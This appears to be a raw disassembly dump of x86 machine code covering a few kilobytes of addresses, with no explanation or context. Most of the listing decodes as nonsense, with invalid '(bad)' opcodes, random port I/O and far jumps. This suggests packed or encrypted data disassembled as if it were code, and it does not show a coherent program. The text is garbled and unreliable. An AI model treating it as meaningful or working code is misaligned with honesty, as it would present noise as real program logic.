  40da0f:	xchg   ebp,eax
  40da10:	inc    ecx
  40da11:	xchg   edi,eax
  40da12:	push   0x40
  40da14:	adc    eax,0x457c46b1
  40da19:	push   esp
  40da1a:	scas   eax,DWORD PTR es:[edi]
  40da1b:	popa   
  40da1c:	sub    ecx,DWORD PTR [eax+0x7144d9c5]
  40da22:	inc    esi
  40da23:	pop    ecx
  40da24:	inc    ebp
  40da25:	mov    esi,DWORD PTR [edi]
  40da27:	ins    BYTE PTR es:[edi],dx
  40da28:	shl    esp,1
  40da2a:	into   
  40da2b:	cmc    
  40da2c:	mov    ?,WORD PTR [esp+eiz*2+0x30a9b846]
  40da33:	mov    al,0x83
  40da35:	adc    al,0x33
  40da37:	in     eax,dx
  40da38:	gs mov edi,0x889e12c6
  40da3e:	xchg   dh,ah
  40da40:	ret    0x9ebe
  40da43:	jb     0x40da12
  40da45:	mov    ah,0x4c
  40da47:	mov    ecx,0xf9ad0f9f
  40da4c:	scas   al,BYTE PTR es:[edi]
  40da4d:	sbb    DWORD PTR [eax],ebx
  40da4f:	sbb    al,0xac
  40da51:	pushf  
  40da52:	push   ss
  40da53:	test   DWORD PTR [edi],ebp
  40da55:	dec    eax
  40da56:	add    dl,BYTE PTR [ebx+0x11ab847b]
  40da5c:	jbe    0x40dab7
  40da5e:	mov    dl,BYTE PTR [edi]
  40da60:	clc    
  40da61:	test   BYTE PTR [ecx+0x11],dl
  40da64:	xor    eax,0x55e5cff7
  40da69:	retf   0xd76d
  40da6c:	dec    edx
  40da6d:	jge    0x40dab2
  40da6f:	sub    BYTE PTR ds:0x637d6720,al
  40da75:	xchg   esp,eax
  40da76:	mov    ecx,0x9f9d8d40
  40da7b:	enter  0x792e,0xca
  40da7f:	inc    BYTE PTR [ebx+ebx*4+0x5f]
  40da83:	mov    esi,0xfa4ac625
  40da88:	loopne 0x40daed
  40da8a:	pop    es
  40da8b:	lds    ecx,FWORD PTR [esi]
  40da8d:	fnstsw WORD PTR [edi]
  40da8f:	push   esp
  40da90:	mov    bh,0x70
  40da92:	fdivr  QWORD PTR [edi+0x5072e09a]
  40da98:	xor    eax,DWORD PTR [ecx-0xbaea6b2]
  40da9e:	fidivr DWORD PTR [edi-0x5058ff0a]
  40daa4:	inc    edx
  40daa5:	out    0x38,eax
  40daa7:	fcom   QWORD PTR [ecx+ebp*4-0x43]
  40daac:	out    0x2f,eax
  40daae:	dec    eax
  40daaf:	mov    ebx,0xdfe39a4b
  40dab4:	in     eax,0x35
  40dab6:	ja     0x40daaa
  40dab8:	stos   DWORD PTR es:[edi],eax
  40dab9:	jne    0x40db18
  40dabb:	mov    cl,0x2f
  40dabd:	out    0x1f,eax
  40dabf:	scas   eax,DWORD PTR es:[edi]
  40dac0:	jnp    0x40db22
  40dac2:	nop
  40dac3:	mov    ebx,ebp
  40dac5:	jne    0x40db42
  40dac7:	xor    ah,BYTE PTR [ebp+0x4c]
  40daca:	lods   al,BYTE PTR ds:[esi]
  40dacb:	xchg   ecx,eax
  40dacc:	std    
  40dacd:	xlat   BYTE PTR ds:[ebx]
  40dace:	sti    
  40dacf:	clc    
  40dad0:	inc    ebp
  40dad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dad2:	addr16 inc esi
  40dad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad5:	push   ecx
  40dad6:	and    edx,DWORD PTR [esi]
  40dad8:	outs   dx,BYTE PTR ds:[esi]
  40dad9:	jl     0x40da65
  40dadb:	and    al,BYTE PTR ds:0xcf12162a
  40dae1:	add    ecx,edx
  40dae3:	or     eax,0x998599f5
  40dae8:	pop    ecx
  40dae9:	add    cl,ch
  40daeb:	mov    ds:0xbdcefe06,eax
  40daf0:	sbb    BYTE PTR [ebx+0x214c48cb],bl
  40daf6:	mov    ch,0x3
  40daf8:	test   eax,0x8ea2a3c2
  40dafd:	mov    ds:0x10cf07fa,eax
  40db02:	inc    edx
  40db03:	dec    ebp
  40db04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db05:	xchg   ebx,eax
  40db06:	mov    esi,0xca9733be
  40db0b:	push   eax
  40db0c:	bound  esi,QWORD PTR [edx]
  40db0e:	jnp    0x40db08
  40db10:	in     al,dx
  40db11:	outs   dx,BYTE PTR ds:[esi]
  40db12:	sub    al,0x82
  40db14:	sbb    eax,0x3730242b
  40db19:	out    dx,eax
  40db1a:	sahf   
  40db1b:	dec    edx
  40db1c:	pop    eax
  40db1d:	mov    eax,0x1955d167
  40db22:	adc    ecx,DWORD PTR [edi+ebx*4]
  40db25:	pop    edi
  40db26:	fist   DWORD PTR [ebx-0x33]
  40db29:	ret    0x16e4
  40db2c:	shl    DWORD PTR [edx+0x581c18cc],0x83
  40db33:	sub    eax,DWORD PTR [edi]
  40db35:	cmp    DWORD PTR [ecx],ebx
  40db37:	lods   eax,DWORD PTR ds:[esi]
  40db38:	inc    edi
  40db39:	(bad)  
  40db3a:	xor    al,0x22
  40db3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db3d:	(bad)  
  40db3e:	mov    gs,WORD PTR [edx]
  40db40:	push   ds
  40db41:	outs   dx,DWORD PTR ds:[esi]
  40db42:	repnz xlat BYTE PTR ds:[ebx]
  40db44:	pop    edi
  40db45:	adc    BYTE PTR [ebx+0x14],al
  40db48:	pop    eax
  40db49:	fs (bad) 
  40db4b:	jp     0x40dada
  40db4d:	mov    dl,0xe
  40db4f:	iret   
  40db50:	jg     0x40db99
  40db52:	int3   
  40db53:	(bad)  
  40db54:	mov    eax,ds:0xb3e9150a
  40db59:	mov    esp,DWORD PTR [edi]
  40db5b:	rol    BYTE PTR [ebx-0xf],0xe1
  40db5f:	out    0xf0,al
  40db61:	cwde   
  40db62:	loope  0x40db9a
  40db64:	mov    esi,0xa9d018b8
  40db69:	dec    edi
  40db6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6b:	mov    ds:0xb5622519,eax
  40db70:	jns    0x40db00
  40db72:	xchg   DWORD PTR [edi+0x4e9b43c9],edx
  40db78:	aas    
  40db79:	in     eax,0x68
  40db7b:	call   ebx
  40db7d:	adc    dl,dh
  40db7f:	sbb    ebx,eax
  40db81:	stos   DWORD PTR es:[edi],eax
  40db82:	inc    edi
  40db83:	sbb    eax,0xbb30a085
  40db88:	nop
  40db89:	mov    eax,0xf71a27ae
  40db8e:	lock sub dh,BYTE PTR [ebp-0x46279627]
  40db95:	or     BYTE PTR [eax],ah
  40db97:	xchg   edx,eax
  40db98:	push   ss
  40db99:	and    eax,0xd0891cfd
  40db9e:	out    dx,eax
  40db9f:	addr16 aaa 
  40dba1:	outs   dx,BYTE PTR ds:[esi]
  40dba2:	icebp  
  40dba3:	fwait
  40dba4:	jmp    DWORD PTR [ebx]
  40dba6:	push   0x51197476
  40dbab:	scas   eax,DWORD PTR es:[edi]
  40dbac:	pop    ss
  40dbad:	(bad)  
  40dbae:	mov    ds:0x4997bc5b,eax
  40dbb3:	mov    ebx,DWORD PTR [ebx-0x40]
  40dbb6:	js     0x40db7a
  40dbb8:	jmp    0x15bb8277
  40dbbd:	addr16 cli 
  40dbbf:	sbb    DWORD PTR [edx],esi
  40dbc1:	fiadd  WORD PTR [ecx+ebp*8+0x47d7e785]
  40dbc8:	mov    ah,0x9f
  40dbca:	mov    BYTE PTR ds:0x2bb903d2,dl
  40dbd0:	das    
  40dbd1:	cmp    al,0xf3
  40dbd3:	jne    0xe2aacce5
  40dbd9:	push   edi
  40dbda:	jnp    0x40db6c
  40dbdc:	add    eax,0xc428895f
  40dbe1:	mov    dh,0x12
  40dbe3:	inc    edi
  40dbe4:	(bad)  
  40dbe5:	bound  edx,QWORD PTR [edi]
  40dbe7:	adc    cl,bl
  40dbe9:	(bad)  
  40dbea:	aam    0x51
  40dbec:	sub    BYTE PTR [eax+0x19],bl
  40dbef:	stos   DWORD PTR es:[edi],eax
  40dbf0:	cwde   
  40dbf1:	bound  esi,QWORD PTR [edi]
  40dbf3:	jnp    0x40db7b
  40dbf5:	ss inc ecx
  40dbf7:	out    0x47,al
  40dbf9:	out    0x1a,eax
  40dbfb:	and    al,0xd8
  40dbfd:	sbb    esp,0xc1f7a6c8
  40dc03:	push   eax
  40dc04:	idiv   BYTE PTR [edx]
  40dc06:	cld    
  40dc07:	xchg   DWORD PTR [ebx],ebp
  40dc09:	jmp    0x40dc80
  40dc0b:	daa    
  40dc0c:	inc    ebx
  40dc0d:	test   DWORD PTR [esi-0x50b26972],esi
  40dc13:	or     DWORD PTR [esi+ebp*4],edi
  40dc16:	inc    edi
  40dc17:	mov    ds:0x27d1022,eax
  40dc1c:	(bad)  
  40dc1d:	adc    DWORD PTR [esi],eax
  40dc1f:	pop    es
  40dc20:	jns    0x40dc6d
  40dc22:	xchg   BYTE PTR [ecx],dh
  40dc24:	dec    ecx
  40dc25:	lahf   
  40dc26:	out    0xbe,al
  40dc28:	cmc    
  40dc29:	xchg   ecx,eax
  40dc2a:	jl     0x40dbc6
  40dc2c:	cmp    dl,BYTE PTR [edi]
  40dc2e:	mov    eax,0x91777246
  40dc33:	test   al,0x11
  40dc35:	jecxz  0x40dca5
  40dc37:	ins    DWORD PTR es:[edi],dx
  40dc38:	inc    esp
  40dc39:	inc    ecx
  40dc3a:	add    esi,DWORD PTR [esi]
  40dc3c:	inc    edi
  40dc3d:	fwait
  40dc3e:	stos   DWORD PTR es:[edi],eax
  40dc3f:	pop    edi
  40dc40:	retf   
  40dc41:	outs   dx,DWORD PTR ds:[esi]
  40dc42:	clc    
  40dc43:	repz adc eax,0xb94e64ab
  40dc49:	outs   dx,DWORD PTR ds:[esi]
  40dc4a:	xchg   ebp,eax
  40dc4b:	es push edi
  40dc4d:	ja     0x40dc5b
  40dc4f:	mov    eax,0x7429f01f
  40dc54:	jb     0x40dc41
  40dc56:	ficomp DWORD PTR ds:0xb989f800
  40dc5c:	stos   BYTE PTR es:[edi],al
  40dc5d:	mov    eax,ds:0x89e36b4
  40dc62:	inc    ebx
  40dc63:	mov    al,0xcf
  40dc65:	imul   esi,DWORD PTR ds:0xf13c4ec5,0x48
  40dc6c:	repz pushf 
  40dc6e:	mov    ch,0xe
  40dc70:	jmp    0x7d2d:0xab6cdadc
  40dc77:	sbb    eax,0xce8f85fe
  40dc7c:	pop    ebp
  40dc7d:	mov    es,WORD PTR [esi+0x72e8b8ae]
  40dc83:	outs   dx,DWORD PTR ds:[esi]
  40dc84:	mov    ah,al
  40dc86:	add    BYTE PTR [ecx-0x4c711868],al
  40dc8c:	mov    eax,ds:0xb8a155ae
  40dc91:	xchg   BYTE PTR [edx+ebx*2],ch
  40dc94:	rcl    BYTE PTR [ebp-0x15e1ec68],cl
  40dc9a:	(bad)
  40dc9e:	xor    al,0xb
  40dca0:	lods   eax,DWORD PTR ds:[esi]
  40dca1:	fsub   DWORD PTR [ebp-0x1887788f]
  40dca7:	push   ebx
  40dca8:	cmp    al,0xd4
  40dcaa:	pop    eax
  40dcab:	mov    bh,0x3
  40dcad:	pop    ds
  40dcae:	pop    es
  40dcaf:	iret   
  40dcb0:	ficom  WORD PTR [ebp-0x56]
  40dcb3:	jbe    0x40dc8b
  40dcb5:	dec    eax
  40dcb6:	xchg   esi,eax
  40dcb7:	push   edi
  40dcb8:	aaa    
  40dcb9:	dec    al
  40dcbb:	push   edi
  40dcbc:	(bad)  
  40dcbe:	add    BYTE PTR [ecx],cl
  40dcc0:	ins    BYTE PTR es:[edi],dx
  40dcc1:	xor    bh,dh
  40dcc3:	test   eax,0x45033df2
  40dcc8:	sub    BYTE PTR [edx],dh
  40dcca:	nop
  40dccb:	(bad)  
  40dccc:	rol    BYTE PTR ds:0x7fb3fa2a,0xca
  40dcd3:	sahf   
  40dcd4:	sahf   
  40dcd5:	(bad)  
  40dcd7:	cmp    al,0xf8
  40dcd9:	fldcw  WORD PTR [edi]
  40dcdb:	mov    bh,0x45
  40dcdd:	push   ebx
  40dcde:	arpl   WORD PTR [edx],ax
  40dce0:	sbb    BYTE PTR [eax+0x4],dl
  40dce3:	push   ss
  40dce4:	jnp    0x40dcd8
  40dce6:	push   ss
  40dce7:	xchg   ecx,eax
  40dce8:	cwde   
  40dce9:	int3   
  40dcea:	jo     0x40dca4
  40dcec:	pop    esi
  40dced:	scas   eax,DWORD PTR es:[edi]
  40dcee:	lods   al,BYTE PTR ds:[esi]
  40dcef:	test   eax,0x8db47563
  40dcf4:	scas   eax,DWORD PTR es:[edi]
  40dcf5:	jg     0x40dcec
  40dcf7:	or     eax,DWORD PTR [esi+ecx*1]
  40dcfa:	xchg   esp,eax
  40dcfb:	mov    ah,0x8f
  40dcfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcfe:	sti    
  40dcff:	sahf   
  40dd00:	ins    BYTE PTR es:[edi],dx
  40dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd02:	sar    BYTE PTR [edx],0x4f
  40dd05:	add    DWORD PTR [eax+0x19],edx
  40dd08:	pop    ebx
  40dd09:	dec    ebp
  40dd0a:	add    BYTE PTR [edx+0x3f],al
  40dd0d:	and    DWORD PTR [ebx-0x4d093f40],0x5
  40dd14:	push   0x23f592a9
  40dd19:	aam    0x5d
  40dd1b:	pusha  
  40dd1c:	jle    0x40dd92
  40dd1e:	mov    WORD PTR [esi-0x6e2485f2],es
  40dd24:	ja     0x40dd6f
  40dd26:	(bad)  
  40dd27:	push   0xf52de4c3
  40dd2c:	inc    ebx
  40dd2d:	outs   dx,DWORD PTR ds:[esi]
  40dd2e:	adc    BYTE PTR [edx],bh
  40dd30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd31:	ins    BYTE PTR es:[edi],dx
  40dd32:	xchg   esp,eax
  40dd33:	ja     0x40ddb1
  40dd35:	repnz fiadd DWORD PTR [esi-0x5]
  40dd39:	icebp  
  40dd3a:	in     al,0xaf
  40dd3c:	cld    
  40dd3d:	retf   0x3173
  40dd40:	pop    edx
  40dd41:	shl    ebx,cl
  40dd43:	iret   
  40dd44:	xchg   ebp,eax
  40dd45:	ins    BYTE PTR es:[edi],dx
  40dd46:	fsubp  st(4),st
  40dd48:	dec    esp
  40dd49:	or     al,BYTE PTR [ebp-0x5b]
  40dd4c:	mov    DWORD PTR [eax+0x4e],esp
  40dd4f:	daa    
  40dd50:	push   ebx
  40dd51:	cmp    edi,DWORD PTR [ebp+0x2a]
  40dd54:	test   bl,dl
  40dd56:	out    dx,eax
  40dd57:	mov    bl,0x92
  40dd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd5a:	jmp    0x1d04:0xeca2cd30
  40dd61:	pop    ss
  40dd62:	repz jne 0x40dd83
  40dd65:	daa    
  40dd66:	sub    eax,0xe9145ed2
  40dd6b:	pop    DWORD PTR [esi-0x61]
  40dd6e:	retf   
  40dd6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd70:	ror    BYTE PTR [ebp+0x62],0x92
  40dd74:	scas   al,BYTE PTR es:[edi]
  40dd75:	cmp    esi,DWORD PTR [ebx+0xac11646]
  40dd7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd7c:	ss fs inc edx
  40dd7f:	iret   
  40dd80:	inc    ecx
  40dd81:	dec    edx
  40dd82:	push   edi
  40dd83:	ret    
  40dd84:	xchg   esi,eax
  40dd85:	xchg   edx,eax
  40dd86:	(bad)  
  40dd88:	ja     0x40dd88
  40dd8a:	fldenv [ebx+0x4b4b6322]
  40dd90:	push   edi
  40dd91:	push   esp
  40dd92:	jle    0x40dda1
  40dd94:	fild   WORD PTR [edx]
  40dd96:	aaa    
  40dd97:	ja     0x40ddba
  40dd99:	sub    eax,esp
  40dd9b:	je     0x40de01
  40dd9d:	sub    DWORD PTR [edx-0x45],0xffffffaf
  40dda1:	ja     0x40dd78
  40dda3:	xchg   ebp,eax
  40dda4:	fcomp  DWORD PTR [ebx-0x21]
  40dda7:	jns    0x40ddc3
  40dda9:	add    DWORD PTR [eax],eax
  40ddab:	and    DWORD PTR [eax-0x73],ecx
  40ddae:	icebp  
  40ddaf:	cmp    ecx,DWORD PTR [ecx+0x4e]
  40ddb2:	sub    al,0xf4
  40ddb4:	(bad)  
  40ddb5:	mov    bl,0x60
  40ddb7:	jmp    0x40dda1
  40ddb9:	jle    0x40ddd3
  40ddbb:	push   es
  40ddbc:	pop    ebp
  40ddbd:	aam    0x28
  40ddbf:	(bad)  
  40ddc0:	fisubr DWORD PTR [ebx-0x3f94d2d2]
  40ddc6:	xchg   ebx,esp
  40ddc8:	jp     0x40ddc3
  40ddca:	sbb    dl,al
  40ddcc:	out    dx,al
  40ddcd:	fwait
  40ddce:	mov    ds:0x6b935697,eax
  40ddd3:	jge    0x40dd66
  40ddd5:	mov    bl,0x21
  40ddd7:	aas    
  40ddd8:	mov    eax,ds:0x39a0dc85
  40dddd:	adc    esi,DWORD PTR [esi+0x24]
  40dde0:	inc    esp
  40dde1:	and    ebp,DWORD PTR [eax+0x52]
  40dde4:	call   0x92baa8c6
  40dde9:	xor    edi,DWORD PTR [edi+ecx*4-0x5616e66d]
  40ddf0:	and    BYTE PTR [ebx+0x578a6b89],ah
  40ddf6:	js     0x40de65
  40ddf8:	and    al,0xd7
  40ddfa:	fwait
  40ddfb:	lahf   
  40ddfc:	xor    dh,cl
  40ddfe:	mov    al,0x50
  40de00:	sti    
  40de01:	pushw  0xff86
  40de04:	or     DWORD PTR [edi+0x391c94df],esi
  40de0a:	(bad)  
  40de0b:	in     eax,0xd4
  40de0d:	push   es
  40de0e:	nop
  40de0f:	xor    BYTE PTR [edx+0x46],al
  40de12:	test   ebp,esp
  40de14:	ss sahf 
  40de16:	out    dx,al
  40de17:	loopne 0x40dde7
  40de19:	adc    al,0xbc
  40de1b:	mov    ds:0x9965f3fb,eax
  40de20:	imul   ebx,DWORD PTR [eax+0x1912372],0xffffffbc
  40de27:	adc    ax,0x7adf
  40de2b:	retf   
  40de2c:	das    
  40de2d:	push   0x8665b0d6
  40de32:	pop    ebp
  40de33:	aad    0xd7
  40de35:	jnp    0x40de34
  40de37:	jge    0x40de21
  40de39:	cwde   
  40de3a:	inc    edi
  40de3b:	and    eax,0x910f5456
  40de40:	or     BYTE PTR [edi-0x3453087e],bl
  40de46:	ja     0x40ddf1
  40de48:	mov    DWORD PTR [edi+0x19],ebx
  40de4b:	or     al,al
  40de4d:	cli    
  40de4e:	loopne 0x40de16
  40de50:	add    al,0xf6
  40de52:	xor    DWORD PTR [ebp-0x1b],eax
  40de55:	sub    eax,0x1c9b16eb
  40de5a:	fisubr WORD PTR [edx+0x75]
  40de5d:	aam    0x83
  40de5f:	push   ss
  40de60:	add    eax,0xb3c9a90d
  40de65:	add    al,BYTE PTR [ecx]
  40de67:	enter  0x1c3f,0xfa
  40de6b:	sti    
  40de6c:	in     al,0x8b
  40de6e:	sbb    BYTE PTR [ecx-0x1f],dl
  40de71:	pop    es
  40de72:	nop
  40de73:	sub    eax,0x3a472af
  40de78:	inc    edx
  40de79:	jecxz  0x40de0f
  40de7b:	mov    ah,0x4e
  40de7d:	push   edx
  40de7e:	xor    BYTE PTR [edx-0x76],0x6d
  40de82:	push   0x3e323e4b
  40de87:	fcomp  st(0)
  40de89:	mov    cl,0x51
  40de8b:	jecxz  0x40de5a
  40de8d:	stos   BYTE PTR es:[edi],al
  40de8e:	out    dx,eax
  40de8f:	out    0x53,al
  40de91:	jmp    0x1e3f:0x6974d882
  40de98:	sahf   
  40de99:	out    0x58,al
  40de9b:	dec    esp
  40de9c:	daa    
  40de9d:	gs pop ss
  40de9f:	ror    DWORD PTR [edi+0x4c7c04bb],0xcc
  40dea6:	ror    DWORD PTR [ebp+0x34],0x87
  40deaa:	(bad)  
  40deab:	xor    bl,BYTE PTR [edx]
  40dead:	stos   DWORD PTR es:[edi],eax
  40deae:	sbb    eax,0x95215838
  40deb3:	add    eax,edi
  40deb5:	test   eax,eax
  40deb7:	je     0x40fd27
  40debd:	jmp    0x40e3c8
  40dec2:	(bad)  
  40dec3:	ror    dl,cl
  40dec5:	rcr    dl,1
  40dec7:	rcr    dl,1
  40dec9:	rol    BYTE PTR [esi-0x60],cl
  40decc:	enter  0xca3a,0xd5
  40ded0:	loop   0x40de99
  40ded2:	sub    BYTE PTR [ebx+0x78],al
  40ded5:	js     0x40df41
  40ded7:	jl     0x40df51
  40ded9:	js     0x40df4b
  40dedb:	add    esi,eax
  40dedd:	pop    esi
  40dede:	rcr    BYTE PTR [esi],1
  40dee0:	add    dh,BYTE PTR [ecx+0x40]
  40dee3:	inc    esi
  40dee4:	sbb    eax,0x1c8da599
  40dee9:	jb     0x40dece
  40deeb:	sbb    bl,BYTE PTR [edx-0x17106b4f]
  40def1:	add    al,0x78
  40def3:	adc    al,0x27
  40def5:	bound  edi,QWORD PTR [ebp+eiz*4+0x54]
  40def9:	nop
  40defa:	ficom  DWORD PTR [esp+ebp*8-0x524abb2f]
  40df01:	ret    
  40df02:	aas    
  40df03:	mov    cl,0x52
  40df05:	mov    BYTE PTR [esi],dl
  40df07:	push   0x20
  40df09:	sahf   
  40df0a:	icebp  
  40df0b:	lods   al,BYTE PTR cs:[esi]
  40df0d:	data16 (bad) 
  40df10:	mov    edx,0x1cb52f3d
  40df15:	lods   al,BYTE PTR ds:[esi]
  40df16:	shr    BYTE PTR [eax+eax*1+0x7d155ae6],0xd6
  40df1e:	fs imul ebp,edx,0x8601ac67
  40df25:	mov    al,ds:0x2cab26e7
  40df2a:	dec    ecx
  40df2b:	imul   edi,DWORD PTR [edi-0xf],0x2ba8c1e5
  40df32:	sub    BYTE PTR [esi],dh
  40df34:	and    al,0xf1
  40df36:	xor    BYTE PTR [ebx+0x16330cad],0x5
  40df3d:	jne    0x40decb
  40df3f:	test   al,0x9b
  40df42:	mov    bl,0xc1
  40df44:	cdq    
  40df45:	mov    al,ds:0xd1e9c2b5
  40df4a:	(bad)  
  40df4b:	repz add BYTE PTR [ecx+0x50cc4065],cl
  40df52:	dec    ebx
  40df53:	mov    eax,ds:0x7318f42d
  40df58:	mov    ecx,0x477fa203
  40df5d:	lahf   
  40df5e:	jge    0x40dfc1
  40df60:	lahf   
  40df61:	adc    al,0x54
  40df63:	aam    0x21
  40df65:	daa    
  40df66:	call   0xf635:0xb5860f72
  40df6d:	fmul   st(6),st
  40df6f:	inc    esp
  40df70:	pop    ecx
  40df71:	sub    BYTE PTR [edi],0x38
  40df74:	lock (bad) 
  40df76:	cld    
  40df77:	(bad)  
  40df78:	mov    cl,0x5b
  40df7a:	sbb    ah,cl
  40df7c:	cmp    eax,edi
  40df7e:	mov    bh,0x26
  40df80:	mov    edx,0xb0cf042e
  40df85:	imul   edx,DWORD PTR [ebx+0x504a4e38],0x1c0a7331
  40df8f:	jle    0x40df26
  40df91:	cmp    al,0xc
  40df93:	xlat   BYTE PTR ds:[ebx]
  40df94:	pop    esp
  40df95:	mov    al,0xe7
  40df97:	fbstp  TBYTE PTR [ebp-0x41676e62]
  40df9d:	push   ss
  40df9e:	sar    edx,0xfc
  40dfa1:	inc    eax
  40dfa2:	loop   0x40df8f
  40dfa4:	or     BYTE PTR [esi+0x6402cf31],0x66
  40dfab:	cmc    
  40dfac:	shr    BYTE PTR [eax],1
  40dfae:	or     DWORD PTR [eax],esp
  40dfb0:	pop    ecx
  40dfb1:	push   eax
  40dfb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb3:	ja     0x40dfbe
  40dfb5:	sub    DWORD PTR [eax-0x6792b14],ecx
  40dfbb:	lods   eax,DWORD PTR ds:[esi]
  40dfbc:	mov    ah,0xe8
  40dfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfbf:	jbe    0x40e010
  40dfc1:	mov    bl,BYTE PTR [ecx+0x5]
  40dfc4:	pushf  
  40dfc5:	mov    dl,0x5a
  40dfc7:	xor    ah,ah
  40dfc9:	xor    ebx,DWORD PTR [edx]
  40dfcb:	std    
  40dfcc:	aaa    
  40dfcd:	sub    al,0xd0
  40dfcf:	scas   eax,DWORD PTR es:[edi]
  40dfd0:	mov    esp,0x8a2db7a5
  40dfd5:	(bad)  
  40dfd6:	aad    0xf1
  40dfd8:	push   0x54
  40dfda:	mov    WORD PTR [ebx],es
  40dfdc:	in     al,dx
  40dfdd:	sahf   
  40dfde:	sbb    ecx,edx
  40dfe0:	outs   dx,BYTE PTR ds:[esi]
  40dfe1:	(bad)  
  40dfe2:	outs   dx,DWORD PTR ds:[esi]
  40dfe3:	cmp    al,0x92
  40dfe5:	mov    ecx,0xf62298d3
  40dfea:	mov    cl,0xf7
  40dfec:	fincstp 
  40dfee:	add    eax,0x129cdf07
  40dff3:	xchg   edx,eax
  40dff4:	ja     0x40dff1
  40dff6:	jle    0x40e022
  40dff8:	dec    eax
  40dff9:	jns    0x40e018
  40dffb:	inc    edi
  40dffc:	dec    esi
  40dffd:	dec    eax
  40dffe:	mov    ds:0x25046019,al
  40e003:	or     BYTE PTR [esi-0x163fd384],dl
  40e009:	ficomp WORD PTR ds:0x3decfcde
  40e00f:	jbe    0x40e084
  40e011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e012:	pop    ebp
  40e013:	repz idiv DWORD PTR [ebx+0x49]
  40e017:	scas   eax,DWORD PTR es:[edi]
  40e018:	(bad)  
  40e019:	icebp  
  40e01a:	inc    esi
  40e01b:	push   edi
  40e01c:	jno    0x40e077
  40e01e:	mov    ds:0x58a7c168,al
  40e023:	call   FWORD PTR [edi+0x62]
  40e026:	add    eax,0xccad267a
  40e02b:	cdq    
  40e02c:	and    esi,0x4e
  40e02f:	retf   
  40e030:	test   dl,cl
  40e032:	dec    esp
  40e033:	xor    ecx,ebx
  40e035:	adc    BYTE PTR [edx+edx*1+0x40],ch
  40e039:	retf   0x2ae5
  40e03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e03d:	push   0xe24903e5
  40e042:	xchg   DWORD PTR [ecx+0x28b7449c],ecx
  40e048:	adc    BYTE PTR [eax+0x32],dl
  40e04b:	jb     0x40dffd
  40e04d:	fadd   QWORD PTR [esi+ebp*2+0x1d5f92a1]
  40e054:	lods   al,BYTE PTR ds:[esi]
  40e055:	cmp    BYTE PTR [ebx-0x35],dl
  40e058:	pop    ebx
  40e059:	(bad)  
  40e05a:	fcmove st,st(0)
  40e05c:	dec    ebp
  40e05d:	pop    ds
  40e05e:	ror    BYTE PTR [ebp+0x53d4e928],1
  40e064:	sbb    ah,BYTE PTR [ecx-0x3a2f48ed]
  40e06a:	in     al,dx
  40e06b:	jae    0x40e064
  40e06d:	push   cs
  40e06e:	out    dx,eax
  40e06f:	xor    eax,0xc20193f5
  40e074:	loopne 0x40e077
  40e076:	cmc    
  40e077:	inc    ebx
  40e078:	mov    esp,0x309dabdd
  40e07d:	sub    al,0x60
  40e07f:	test   eax,0x1194cc61
  40e084:	jo     0x40e09e
  40e086:	ja     0x40e105
  40e088:	inc    esp
  40e089:	(bad)  
  40e08a:	jne    0x40e073
  40e08c:	dec    esp
  40e08d:	icebp  
  40e08e:	mov    bl,0x5e
  40e090:	sbb    DWORD PTR [edi+0x45b0f7c],eax
  40e096:	jmp    0x40e045
  40e098:	cmc    
  40e099:	pop    ds
  40e09a:	cmp    eax,0x6557afaf
  40e09f:	add    eax,edi
  40e0a1:	add    esp,DWORD PTR [ebp-0x1d9227b8]
  40e0a7:	pop    ebx
  40e0a8:	sub    BYTE PTR [edi-0x71ef5726],ch
  40e0ae:	mov    ch,0xaf
  40e0b0:	popf   
  40e0b1:	adc    ah,bl
  40e0b3:	sub    DWORD PTR [ebx-0x75d6363f],edx
  40e0b9:	mov    BYTE PTR [ebx],bl
  40e0bb:	lds    esp,FWORD PTR [edx]
  40e0bd:	inc    esi
  40e0be:	xchg   ecx,eax
  40e0bf:	mov    al,ds:0xccac8720
  40e0c4:	out    0xb,eax
  40e0c6:	dec    ecx
  40e0c7:	push   ebp
  40e0c8:	xor    eax,0x795dad75
  40e0cd:	adc    eax,0x4ff006fe
  40e0d2:	repnz nop
  40e0d4:	test   DWORD PTR [eax-0x18],esi
  40e0d7:	mov    WORD PTR ds:0xd3676fa6,gs
  40e0dd:	sti    
  40e0de:	and    al,0xd
  40e0e0:	int3   
  40e0e1:	cmp    BYTE PTR [esi],al
  40e0e3:	fnsave [ebx]
  40e0e5:	popf   
  40e0e6:	add    al,0x4c
  40e0e8:	push   cs
  40e0e9:	aad    0x5c
  40e0eb:	(bad)  
  40e0ec:	repz push 0xffffffbf
  40e0ef:	pop    ds
  40e0f0:	add    BYTE PTR [ecx-0x24ac07ef],dl
  40e0f6:	ret    0xbfc4
  40e0f9:	int    0xd0
  40e0fb:	out    0x37,eax
  40e0fd:	sub    ebp,ebx
  40e0ff:	les    edi,FWORD PTR [ecx+0x4246d3ce]
  40e105:	inc    ecx
  40e106:	sbb    BYTE PTR [esp+eax*4],ch
  40e109:	push   es
  40e10a:	add    DWORD PTR [edx-0x23],ecx
  40e10d:	cmp    eax,0x20c11ba0
  40e112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e113:	cmp    al,0x44
  40e115:	xchg   ecx,eax
  40e116:	mov    WORD PTR [esi-0x692a969a],?
  40e11c:	stc    
  40e11d:	and    DWORD PTR [ebx],edi
  40e11f:	xchg   BYTE PTR [edx+0x549f63d2],bh
  40e125:	jp     0x40e0e8
  40e127:	ins    BYTE PTR es:[edi],dx
  40e128:	mov    bh,0xe2
  40e12a:	or     bh,BYTE PTR [ecx]
  40e12c:	add    BYTE PTR [ebp+0x1a],ch
